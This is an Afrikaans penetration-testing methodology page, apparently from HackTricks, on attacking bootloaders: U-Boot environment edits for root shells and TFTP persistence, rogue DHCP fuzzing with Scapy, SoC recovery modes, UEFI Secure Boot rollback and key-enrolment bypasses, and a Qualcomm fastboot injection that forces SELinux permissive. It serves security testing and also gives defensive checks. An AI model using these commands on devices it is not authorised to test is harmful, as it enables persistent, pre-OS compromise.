# Bootloader-toetsing

{{#include ../../banners/hacktricks-training.md}}

Die volgende stappe word aanbeveel om toestelopstartkonfigurasies te wysig en bootloaders soos U-Boot en UEFI-klaslaaiers te toets. Fokus daarop om vroeë kode-uitvoering te verkry, handtekening-/terugrolbeskerming te beoordeel en herstel- of netwerklaaipaaie te misbruik.

Verwant: MediaTek secure-boot-omseiling deur bl2_ext-patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot-vinnige oorwinnings en misbruik van die omgewing

1. Kry toegang tot die interpreter shell
   - Druk tydens opstart ’n bekende onderbrekingsleutel (dikwels enige sleutel, 0, spasiebalk of ’n bordspesifieke "magic"-volgorde) voordat `bootcmd` uitgevoer word om na die U-Boot-prompt te gaan.<sup>[[1]](#references)</sup>

2. Gaan die opstarttoestand en veranderlikes na
   - Nuttige opdragte:
     - `printenv` (stort die omgewing)
     - `bdinfo` (bordinligting, geheueadresse)
     - `help bootm; help booti; help bootz` (ondersteunde kernel-opstartmetodes)
     - `help ext4load; help fatload; help tftpboot` (beskikbare laaiers)

3. Wysig opstartargumente om ’n root shell te kry
   - Voeg `init=/bin/sh` by sodat die kernel na ’n shell gaan in plaas van die gewone init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot vanaf jou TFTP-bediener
   - Konfigureer die netwerk en haal ’n kernel-/fit-image vanaf die LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Volhard veranderinge via die omgewing
   - As env-berging nie skryfbeskerm is nie, kan jy beheer volhard:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Gaan na veranderlikes soos `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` wat terugvalpaaie beïnvloed. Verkeerd gekonfigureerde waardes kan herhaalde toegang tot die shell verleen.

6. Gaan debug-/onveilige kenmerke na
   - Soek na: `bootdelay` > 0, `autoboot` gedeaktiveer, onbeperkte `usb start; fatload usb 0:1 ...`, die vermoë om `loady`/`loads` via serial te gebruik, `env import` vanaf onbetroubare media, en kernels/ramdisks wat sonder handtekeningkontroles gelaai word.

7. U-Boot-beeld-/verifikasietoetsing
   - As die platform beweer dat dit secure/verified boot met FIT-beelde gebruik, probeer beide ongetekende en gepeuter­de beelde:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Die afwesigheid van `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` of die legacy `verify=n`-gedrag maak dit dikwels moontlik om arbitrêre payloads te laai.
   - Moenie by ’n eenvoudige toelaat-/weier-resultaat stop nie: onlangse FIT-navorsing het getoon dat die verifikasiepad self ’n pre-auth-aanvaloppervlak kan wees. Toets ekstern gestoor FIT-data negatief (`data-offset`, `data-position`, `data-size`), ondertekende konfigurasiekeuse, `loadables` en overlay- / `extra-conf`-hantering.
   - As jy ’n ooreenstemmende bronboom het, is `test/vboot/vboot_test.sh` ’n vinnige manier om FIT-verifikasiegedrag in U-Boot-sandbox te reproduseer voordat jy regte hardeware hanteer.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` en script-bootflows
   - Op moderne U-Boot-bouweergawes is `bootcmd` dikwels net ’n omhulsel om Standard Boot. Dit beteken skryfbare media, PXE of SPI-flitsgeheue kan die werklike vertrouensgrens word, selfs wanneer die sigbare omgewing onskuldig lyk.
   - Die `extlinux`-bootmeth soek na `extlinux/extlinux.conf` onder `/` en `/boot`; die script-bootmeth soek eers na `boot.scr.uimg` en dan na `boot.scr`. By netwerklaai kan die script-lêernaam van `boot_script_dhcp` kom.
   - Nuttige triage-opdragte:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Misbruikgevalle om te toets: aanvallerbeheerde USB-/SD-media vroeër in `boot_targets`, skryfbare `/boot/extlinux/extlinux.conf`, rogue TFTP wat `boot.scr` verskaf, of SPI-gesteunde skripuitvoering via `script_offset_f`.
   - As die platform op FIT-verifikasie staatmaak, maak seker dat konfigurasies op konfigurasievlak onderteken is en nie net per beeld nie; `required-mode=all` is sterker as om enige enkele vereiste sleutel te aanvaar.

## Netwerklaaivlak (DHCP/PXE) en rogue bedieners

9. DHCP/PXE-parameterfuzzing
   - U-Boot se verouderde BOOTP/DHCP-hantering het geheueveiligheidskwessies gehad. CVE‑2024‑42040 beskryf byvoorbeeld geheuelekkasie via vervaardigde DHCP-antwoorde wat grepe uit U-Boot-geheue oor die netwerk kan lek.<sup>[[4]](#references)</sup> Toets die DHCP/PXE-kodepaaie met buitensporig lang/grensgevalwaardes (opsie 67 bootfile-name, vendor options, file/servername-velde) en let op vir vaslopers/leaks.
   - Minimale Scapy-brokkie om selflaaiparameters tydens netwerklading te stres:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Valideer ook of PXE-lêernaamvelde sonder sanitisering aan shell-/loader-logika deurgegee word wanneer hulle aan OS-kant aan voorsieningsskripte gekoppel word.

10. Toetsing van opdraginjectie in ’n rogue DHCP-bediener
   - Stel ’n rogue DHCP/PXE-diens op en probeer karakters in lêernaam- of opsievelde injecteer om opdraginterpreteerders in latere stadiums van die selflaaiketting te bereik. Metasploit se DHCP auxiliary, `dnsmasq` of pasgemaakte Scapy-skripte werk goed. Isoleer eers die labnetwerk.

## SoC-ROM-herstelmodusse wat normale selflaai oorheers

Baie SoC’s bied ’n BootROM-"loader"-modus wat kode via USB/UART aanvaar, selfs wanneer flash-beelde ongeldig is. As secure-boot-fuses nie geblaas is nie, kan dit arbitrêre kode-uitvoering baie vroeg in die ketting moontlik maak.

- NXP i.MX (Serial Download Mode)
  - Gereedskap: `uuu` (mfgtools3) of `imx-usb-loader`.
  - Voorbeeld: `imx-usb-loader u-boot.imx` om ’n pasgemaakte U-Boot vanaf RAM te stuur en uit te voer.
- Allwinner (FEL)
  - Gereedskap: `sunxi-fel`.
  - Voorbeeld: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` of `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Gereedskap: `rkdeveloptool`.
  - Voorbeeld: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` om ’n loader te laai en ’n pasgemaakte U-Boot op te laai.

Bepaal of die toestel se secure-boot-eFuses/OTP geblaas is. Indien nie, omseil BootROM-aflaaimodusse dikwels enige verifikasie op hoër vlak (U-Boot, kernel, rootfs) deur jou eerste-stadium-payload direk vanaf SRAM/DRAM uit te voer.

## UEFI-/PC-klas-selflaailaaiers: vinnige kontroles

11. Toetsing van ESP-peutering, terugrol en sleutelinskrywing
   - Monteer die EFI System Partition (ESP) en kyk vir loader-komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, paaie na vervaardigerlogo’s.
   - Stort die Secure Boot-toestand en sleutel-databasisse vanaf die OS indien moontlik:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - As die platform in Setup Mode is, ongemagtigde sleutelregistrasie aanvaar, of met ’n toets-/standaard-Platform Key (PKfail-klas) gelewer word, kan ’n plaaslike admin of fisiese aanvaller hul eie KEK/db registreer en Secure Boot “geaktiveer” laat lyk terwyl arbitrêre EFI-binaries gelaai word.<sup>[[3]](#references)</sup>
   - Probeer om met afgegradeerde of bekende kwesbare, ondertekende selflaaikomponente te begin as Secure Boot-herroepings (dbx) nie op datum is nie. As die platform steeds ou shims/bootmanagers vertrou, kan jy dikwels jou eie kernel of `grub.cfg` vanaf die ESP laai om volharding te verkry.
   - Op Windows kan gepatchte gashere steeds kwesbare, ondertekende bootmanagers aanvaar as die `Microsoft Windows Production PCA 2011`-ondertekenaar in die firmware se `dbx` ontbreek, soos met BlackX waargeneem is.<sup>[[13]](#references)[[14]](#references)</sup> ’n Baton Drop-styl-omseiling kan ’n aanvaller se MOK registreer; ’n wettige shim kan dan met latere selflaaie ’n EFI-loonvrag laai wat deur daardie sleutel onderteken is.<sup>[[12]](#references)[[13]](#references)</sup> As die ou Windows-ondertekenaar later herroep word, word die geregistreerde MOK nie verwyder nie, so die shim-gebaseerde pad kan voortduur as daardie shim vertrou bly.<sup>[[12]](#references)</sup>
   - Voordat jy hierdie rollback-pad op ’n gemagtigde UEFI-masjien toets, gaan die **effektiewe firmware-herroepingstoestand** na, nie net die Windows-opdateringsgeskiedenis nie.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft verskaf hierdie leesalleen-kontrole in verhoogde PowerShell vir die 2011-ondertekenaar in `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` is slegs ’n leidraad: bevestig die spesifieke ondertekende selflaaikomponent en ander herroepings in ’n herstelbare laboratorium.<sup>[[12]](#references)[[14]](#references)</sup> ’n Hangende registeropdatering of ’n vervalde ondertekeningsertifikaat is nie gelykstaande aan ’n voltooide `dbx`-herroeping nie.<sup>[[13]](#references)[[14]](#references)</sup>

12. Verouderde shim / SBAT / dbx-herroepingstoetsing
   - Ou Microsoft-ondertekende shims en verskaffervurke kan steeds as ’n BYOVD-styl bootkit-pad dien as herroepings verouderd is. Plaas in ’n geïsoleerde laboratorium ’n histories kwesbare shim op die ESP en probeer om jou eie `grubx64.efi` of kernel te kettinglaai.<sup>[[11]](#references)</sup>
   - Vinnige triage:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - As die shim steeds loop ondanks dat dit op die herroepingslys is, het die firmware/OS verouderde `dbx`-opdaterings, of vertrou dit ’n gevorkte loader wat nooit stroomop-SBAT-beskerming geërf het nie.

13. Foute in die ontleding van opstartlogo’s (LogoFAIL-klas)
   - Verskeie OEM/IBV-firmware was kwesbaar vir beeldontledingsfoute in DXE wat opstartlogo’s verwerk. As ’n aanvaller ’n spesiaal vervaardigde beeld op die ESP onder ’n verskafferspesifieke pad kan plaas (bv. `\EFI\<vendor>\logo\*.bmp`) en die toestel herbegin, kan code execution tydens vroeë opstart moontlik wees, selfs met Secure Boot geaktiveer. Toets of die platform logo’s aanvaar wat deur die gebruiker verskaf is, en of daardie paaie vanaf die OS skryfbaar is.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) vertrouensgapings

Op Android 16-toestelle wat Qualcomm se ABL gebruik om die **Generic Bootloader Library (GBL)** te laai, bepaal of ABL die UEFI-app wat dit vanaf die `efisp`-partisie laai, **verifieer**. As ABL slegs kyk of ’n UEFI-app **teenwoordig** is en nie handtekeninge verifieer nie, word ’n write primitive na `efisp` **pre-OS unsigned code execution** tydens opstart.<sup>[[6]](#references)[[7]](#references)</sup>

Praktiese kontroles en misbruikpaaie:

- **efisp write primitive**: Jy het ’n manier nodig om ’n pasgemaakte UEFI-app na `efisp` te skryf (root/geprivilegieerde diens, ’n fout in ’n OEM-app, of ’n recovery/fastboot-pad). Sonder dit is die GBL-laaigaping nie direk bereikbaar nie.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL-fout): Sommige builds aanvaar ekstra tokens in `fastboot oem set-gpu-preemption` en voeg dit by die kernel-cmdline. Dit kan gebruik word om permissive SELinux af te dwing, wat skryf na beskermde partisies moontlik maak:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Indien die toestel gepatch is, behoort die opdrag ekstra argumente te verwerp.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader-ontsluiting via persistente vlae**: ’n Payload in die selflaaifase kan persistente ontsluitingsvlae verander (bv. `is_unlocked=1`, `is_unlocked_critical=1`) om `fastboot oem unlock` na te boots sonder OEM-bediener-/goedkeuringsversperrings. Dit is ’n blywende verandering in die toestel se sekuriteitstoestand ná die volgende herlaai.<sup>[[6]](#references)</sup>

Verdedigings-/triage-aantekeninge:

- Bevestig of ABL handtekeningverifikasie op die GBL/UEFI-payload vanaf `efisp` uitvoer. Indien nie, behandel `efisp` as ’n hoërisiko-persistensie-oppervlak.
- Hou dop of ABL se fastboot OEM-hanteerders gepatch is om **argumenttellings te valideer** en bykomende tokens te verwerp.<sup>[[8]](#references)[[9]](#references)</sup>

## Hardeware-waarskuwing

Wees versigtig wanneer jy tydens vroeë selflaai met SPI/NAND-flitsgeheue werk (bv. deur penne te aard om leesbewerkings te omseil), en raadpleeg altyd die flitsgeheue se datablad. Verkeerd getimede kortsluitings kan die toestel of die programmeerder beskadig.

## Aantekeninge en bykomende wenke

- Probeer `env export -t ${loadaddr}` en `env import -t ${loadaddr}` om omgewingsblobs tussen RAM en berging te verskuif; sommige platforms laat toe dat omgewingsdata vanaf verwyderbare media ingevoer word sonder verifikasie.
- Vir persistensie op Linux-gebaseerde stelsels wat via `extlinux.conf` selflaai, is dit dikwels genoeg om die `APPEND`-reël (om `init=/bin/sh` of `rd.break` in te voeg) op die selflaaipartisie te wysig wanneer geen handtekeningkontroles afgedwing word nie.
- As die teiken dubbele gleuf-/A/B-opdaterings gebruik, hersien die anti-terugrol- en gleuf-desinkroniseringstegnieke in die [oorsig van firmware-analise](README.md) sodat jy nie vertrouensgapings miskyk wat net buite die selflaaiprogram se opdateringsmeganisme voorkom nie.
- As gebruikersland `fw_printenv/fw_setenv` verskaf, bevestig dat `/etc/fw_env.config` met die werklike omgewingsberging ooreenstem. Verkeerd ingestelde afsetsels kan veroorsaak dat jy die verkeerde MTD-streek lees/skryf.

## References

- [1] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Vind van LogoFAIL: Die gevare van beeldontleding tydens stelselselflaai](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Onbetroubare platformsleutels ondermyn Secure Boot in die UEFI-ekosisteem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040-besonderhede](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Vooruitgeloop: Ontsluiting van Xiaomi via twee ongesaniteerde stringe](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL-uitbuiting laat aanvallers toe om bootloaders te ontsluit](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generiese Bootloader (GBL)-argitektuur](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Regstelling van die deurvoer van onbetroubare invoer na die kernel-opdragreël](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Voeg ’n kontrole by vir die set-hw-fence-value-opdrag](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Ongeskik om te selflaai: verbreking van U-Boot se FIT-handtekeningverifikasie](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Kennisgewing oor kwesbaarheid VU#616257 - Microsoft-ondertekende UEFI-shim-selflaaiers kwesbaar vir omseiling van Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI-bootkit: Mite bevestig](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: ’n BlackLotus-agtige UEFI-bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Hoe om Windows Boot Manager-herroepings vir Secure Boot-veranderinge te bestuur](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
